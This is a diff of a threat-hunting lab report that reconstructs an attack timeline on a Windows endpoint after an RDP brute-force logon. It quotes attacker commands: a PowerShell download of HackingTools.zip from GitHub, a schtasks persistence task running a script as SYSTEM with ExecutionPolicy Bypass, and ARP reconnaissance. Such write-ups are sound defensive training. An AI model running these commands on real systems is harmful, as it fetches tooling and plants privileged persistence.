@@ -220,7 +220,7 @@ DeviceProcessEvents
 - **Timestamp:** `2025-03-15T15:02:10.5325975Z`
 - **Event:** The threat actor successfully logged into the user account `aaronmart` on the endpoint `arm-thcompromis` after a RDP Brute Force attack.
 - **Action:** Successful logon.
-- 
+
 ### 2. Invoke-WebRequest Execution - The Threat Actor Initiates a File Download
 
 - **Timestamp:** `2025-03-15T15:02:38.6575957Z`
@@ -239,25 +239,25 @@ DeviceProcessEvents
 ### 4. HackingTools.zip Downloaded - MaliciousExecutable.exe Executes a File Download
 
 - **Timestamp:** `2025-03-15T15:02:57.0097307Z`
-- **Event:** The malicious file `MaliciousExecutable.exe`, initiates the download of the file 'HackingTools.zip`.
+- **Event:** The malicious file `MaliciousExecutable.exe`, initiates the download of the file `HackingTools.zip`.
 - **Action:** File download detected.
-- **Process:** `powershell.exe`
 - **File Path:** `C:\Users\aaronmart\Downloads\HackingTools.zip`
+- **Command:** `Invoke-WebRequest -Uri "https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/HackingTools.zip" -OutFile "$env:USERPROFILE\Downloads\HackingTools.zip"`
 
-### 5. Additional Network Connections - TOR Browser Activity
+### 5. A Scheduled Task is Created - MaliciousExecutable.exe Creates a Scheduled Task for Persistence
 
-- **Timestamps:**
-  - `2025-03-05T01:07:35.4402831Z` - Connected to `37.120.31.130` on port `9001`.
-  - `2025-03-05T01:08:00.5241Z` - Connected to `89.44.198.196` on port `9001`.
-- **Event:** Additional TOR network connections were established, indicating ongoing activity by user "aaronmart" through the TOR browser.
-- **Action:** Multiple successful connections detected.
+- **Timestamps:** `2025-03-15T15:02:57.0097307Z`
+- **Event:** The malicious file `MaliciousExecutable.exe` generates a Scheduled Task to gain persistence on the endpoint `arm-thcompromis`.
+- **Action:** A newly created ScheduledTask is detected.
+- **Command:** `schtasks /create /tn "PersistenceScheduledTask" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:USERPROFILE\Downloads\HackingTools\HackingTools\PersistenceScript.ps1" /sc onlogon /ru SYSTEM /f`
 
-### 6. File Creation - TOR Shopping List
+### 6. Non-Intrusive Network Reconnaissance - MaliciousExecutable.exe Conducts Non-Intrusive Network Reconnaissance
 
-- **Timestamp:** `2025-03-05T01:24:05.3837414Z`
-- **Event:** The user "aaronmart" created a file named `tor-shopping-list.txt` on the desktop, potentially indicating a list or notes related to their TOR browser activities.
-- **Action:** File creation detected.
-- **File Path:** `C:\Users\aaronmart\Desktop\tor-shopping-list.txt`
+- **Timestamp:** `2025-03-15T15:02:57.0097307Z`
+- **Event:** The malicious file `MaliciousExecutable.exe` conducts non-intrusive network reconnaissance on the endpoint `arm-thcompromis` and saves the results in a text file called 'arp_results.txt` on the `Desktop`.
+- **Action:** Network reconnaissance is conducted.
+- **Process:** `powershell.exe`
+- **Command:** `arp -a | Out-File -FilePath "$env:USERPROFILE\Desktop\arp_results.txt"`
 
 ---
 
